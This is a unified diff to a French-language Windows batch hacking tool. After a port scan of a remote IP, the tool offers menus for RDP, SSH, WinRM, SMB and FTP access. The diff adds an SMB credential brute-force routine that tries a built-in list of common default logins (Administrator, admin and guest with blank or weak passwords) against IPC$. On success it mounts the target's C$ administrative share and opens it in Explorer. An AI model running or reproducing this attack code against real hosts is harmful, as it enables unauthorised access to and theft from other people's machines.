@@ -2685,45 +2685,61 @@ if not defined found_ports (
 )
 
 :wan_post_scan
+set "fp=,!found_ports!,"
+call :DynamicMenu "QUE FAIRE AVEC CETTE CIBLE ?" "J'ai le mot de passe~Connexion directe : RDP, SSH, SMB C$, WinRM, RPC;Je n'ai pas le mot de passe~Tests anonymes + recherche de credentials;Retour" "NONUMS NOCLS"
+set "pwd_ch=%errorlevel%"
+if "%pwd_ch%"=="0" goto cyber_ip_grabber
+if "%pwd_ch%"=="1" goto wan_menu_creds
+if "%pwd_ch%"=="2" goto wan_menu_nocreds
+goto cyber_ip_grabber
+
+:wan_menu_creds
 set "fwd_opts=Retour"
 set "fwd_actions=retour"
-set "fp=,!found_ports!,"
-
-if not "!fp:,445,=!"=="!fp!" set "fwd_opts=Explorer partages SMB (C$, Admin$, partages);!fwd_opts!" & set "fwd_actions=smb,!fwd_actions!"
-if not "!fp:,445,=!"=="!fp!" set "fwd_opts=[SMB] Test session anonyme - sans mot de passe;!fwd_opts!" & set "fwd_actions=smb_null,!fwd_actions!"
-if not "!fp:,445,=!"=="!fp!" set "fwd_opts=[SMB] Acces disque C$ - mot de passe requis;!fwd_opts!" & set "fwd_actions=smb_creds,!fwd_actions!"
-if not "!fp:,135,=!"=="!fp!" set "fwd_opts=[RPC] WMI/DCOM - mot de passe requis + firewall cible;!fwd_opts!" & set "fwd_actions=rpc_enum,!fwd_actions!"
-if not "!fp:,21,=!"=="!fp!" set "fwd_opts=[FTP] Test login anonyme - sans mot de passe;!fwd_opts!" & set "fwd_actions=ftp_anon,!fwd_actions!"
-if not "!fp:,5985,=!"=="!fp!" set "fwd_opts=[WinRM] Session PowerShell - mot de passe requis;!fwd_opts!" & set "fwd_actions=winrm,!fwd_actions!"
-if not "!fp:,22,=!"=="!fp!" set "fwd_opts=[SSH] Connexion terminal - mot de passe requis;!fwd_opts!" & set "fwd_actions=ssh,!fwd_actions!"
-if not "!fp:,3389,=!"=="!fp!" set "fwd_opts=[RDP] Bureau a distance - mot de passe requis;!fwd_opts!" & set "fwd_actions=rdp,!fwd_actions!"
-
-call :DynamicMenu "QUE FAIRE AVEC CETTE CIBLE ?" "!fwd_opts!" "NONUMS NOCLS"
+if not "!fp:,135,=!"=="!fp!" set "fwd_opts=[RPC] WMI/DCOM~Enumeration WMI distante (firewall requis);!fwd_opts!" & set "fwd_actions=rpc_enum,!fwd_actions!"
+if not "!fp:,445,=!"=="!fp!" set "fwd_opts=[SMB] Acces disque C$~Monte le partage C$ avec identifiants;!fwd_opts!" & set "fwd_actions=smb_creds,!fwd_actions!"
+if not "!fp:,5985,=!"=="!fp!" set "fwd_opts=[WinRM] Session PowerShell~Shell distant via WinRM;!fwd_opts!" & set "fwd_actions=winrm,!fwd_actions!"
+if not "!fp:,22,=!"=="!fp!" set "fwd_opts=[SSH] Connexion terminal~Shell SSH avec identifiants;!fwd_opts!" & set "fwd_actions=ssh,!fwd_actions!"
+if not "!fp:,3389,=!"=="!fp!" set "fwd_opts=[RDP] Bureau a distance~Interface graphique distante;!fwd_opts!" & set "fwd_actions=rdp,!fwd_actions!"
+call :DynamicMenu "CONNEXION AVEC MOT DE PASSE" "!fwd_opts!" "NONUMS NOCLS"
 set "fwd_ch=%errorlevel%"
+if "%fwd_ch%"=="0" goto wan_post_scan
+goto wan_dispatch
 
-if "%fwd_ch%"=="0" goto cyber_ip_grabber
+:wan_menu_nocreds
+set "fwd_opts=Retour"
+set "fwd_actions=retour"
+if not "!fp:,445,=!"=="!fp!" set "fwd_opts=[BRUTE] Tester credentials communs~Teste admin/guest avec mots de passe courants (SMB);!fwd_opts!" & set "fwd_actions=smb_brute,!fwd_actions!"
+if not "!fp:,445,=!"=="!fp!" set "fwd_opts=Explorer partages SMB~Parcourir C$, Admin$ et partages;!fwd_opts!" & set "fwd_actions=smb,!fwd_actions!"
+if not "!fp:,445,=!"=="!fp!" set "fwd_opts=[SMB] Test session anonyme~Connexion IPC$ sans identifiants;!fwd_opts!" & set "fwd_actions=smb_null,!fwd_actions!"
+if not "!fp:,21,=!"=="!fp!" set "fwd_opts=[FTP] Login anonyme~Test acces FTP sans compte;!fwd_opts!" & set "fwd_actions=ftp_anon,!fwd_actions!"
+call :DynamicMenu "ACCES SANS MOT DE PASSE" "!fwd_opts!" "NONUMS NOCLS"
+set "fwd_ch=%errorlevel%"
+if "%fwd_ch%"=="0" goto wan_post_scan
+goto wan_dispatch
 
+:wan_dispatch
+set "sel_action="
 set "idx=0"
 for %%A in (!fwd_actions!) do (
     set /a idx+=1
     if "!idx!"=="!fwd_ch!" set "sel_action=%%A"
 )
-
 if "!sel_action!"=="rdp" (
     echo.
     echo  [i] Lancement connexion Bureau a distance vers !remote_ip!...
     start mstsc /v:!remote_ip!
     pause
-    goto wan_post_scan
+    goto wan_menu_creds
 )
 if "!sel_action!"=="ssh" (
     echo.
     echo  [i] Connexion SSH vers !remote_ip!...
     set /p "ssh_user=Utilisateur cible : "
-    if not defined ssh_user goto wan_post_scan
+    if not defined ssh_user goto wan_menu_creds
     if "!remote_port!"=="NONE" (ssh !ssh_user!@!remote_ip!) else (ssh -p !remote_port! !ssh_user!@!remote_ip!)
     pause
-    goto wan_post_scan
+    goto wan_menu_creds
 )
 if "!sel_action!"=="winrm" (
     cls
@@ -2731,16 +2747,16 @@ if "!sel_action!"=="winrm" (
     echo [i] Tentative de connexion WinRM Remote PowerShell sur !remote_ip!...
     powershell -NoProfile -Command "Enter-PSSession -ComputerName !remote_ip! -Credential (Get-Credential)"
     pause
-    goto wan_post_scan
+    goto wan_menu_creds
 )
-if "!sel_action!"=="smb" (set "smb_ret=wan_post_scan" & goto smb_explore)
-if "!sel_action!"=="retour" goto cyber_ip_grabber
-
+if "!sel_action!"=="smb" (set "smb_ret=wan_menu_nocreds" & goto smb_explore)
+if "!sel_action!"=="retour" goto wan_post_scan
 if "!sel_action!"=="smb_null" goto action_smb_null
 if "!sel_action!"=="smb_creds" goto action_smb_creds
 if "!sel_action!"=="rpc_enum" goto action_rpc_enum
 if "!sel_action!"=="ftp_anon" goto action_ftp_anon
-goto cyber_ip_grabber
+if "!sel_action!"=="smb_brute" goto action_smb_brute
+goto wan_post_scan
 
 :action_smb_creds
 cls
@@ -2916,6 +2932,77 @@ if exist "%FTP_TMP%" del /f /q "%FTP_TMP%"
 echo.
 pause
 goto wan_post_scan
+
+:action_smb_brute
+cls
+echo.
+echo %B%  [BRUTE] CREDENTIALS COMMUNS - SMB%N%
+echo  Cible : !remote_ip!
+echo.
+set "smb_host=!remote_ip!"
+set "tmp_v6=!remote_ip::=!"
+if not "!tmp_v6!"=="!remote_ip!" set "smb_host=!remote_ip::=-!.ipv6-literal.net"
+set "b_u="
+set "b_p="
+echo  [*] Test sur \\!smb_host!\IPC$ ...
+echo.
+if not defined b_u call :brute_try "Administrator" ""
+if not defined b_u call :brute_try "Administrator" "admin"
+if not defined b_u call :brute_try "Administrator" "password"
+if not defined b_u call :brute_try "Administrator" "123456"
+if not defined b_u call :brute_try "Administrator" "admin123"
+if not defined b_u call :brute_try "Administrator" "Pa$$w0rd"
+if not defined b_u call :brute_try "admin" ""
+if not defined b_u call :brute_try "admin" "admin"
+if not defined b_u call :brute_try "admin" "password"
+if not defined b_u call :brute_try "admin" "1234"
+if not defined b_u call :brute_try "admin" "123456"
+if not defined b_u call :brute_try "guest" ""
+if not defined b_u call :brute_try "guest" "guest"
+if defined b_u goto brute_found
+echo.
+echo  [-] Aucun credential commun accepte.
+echo.
+pause
+goto wan_menu_nocreds
+
+:brute_found
+echo.
+echo  ================================================
+echo  [+] CREDENTIAL TROUVE ^!
+echo      Login : !b_u!
+echo      MDP   : !b_p!
+echo  ================================================
+echo.
+echo  [*] Tentative de connexion C$ en cours...
+net use "\\!smb_host!\C$" "!b_p!" /user:"!b_u!" >nul 2>&1
+if errorlevel 1 (
+    echo  [-] C$ refuse malgre les credentials ^(restrictions GPO ?^)
+    echo  [i] Utilisez ^"J'ai le mot de passe^" pour tenter d'autres partages.
+    echo.
+    pause
+    goto wan_menu_nocreds
+)
+echo  [+] ACCES C$ OK ^! Ouverture explorateur...
+start explorer "\\!smb_host!\C$"
+echo.
+echo  [i] Partage connecte. Pour deconnecter : net use \\!smb_host!\C$ /delete
+echo.
+set "b_u="
+set "b_p="
+pause
+net use "\\!smb_host!\C$" /delete >nul 2>&1
+goto wan_post_scan
+
+:brute_try
+echo  [-] %~1 / %~2
+net use "\\!smb_host!\IPC$" "%~2" /user:"%~1" >nul 2>&1
+if not errorlevel 1 (
+    net use "\\!smb_host!\IPC$" /delete >nul 2>&1
+    set "b_u=%~1"
+    set "b_p=%~2"
+)
+goto :eof
 
 :start_lan_scan
 echo.
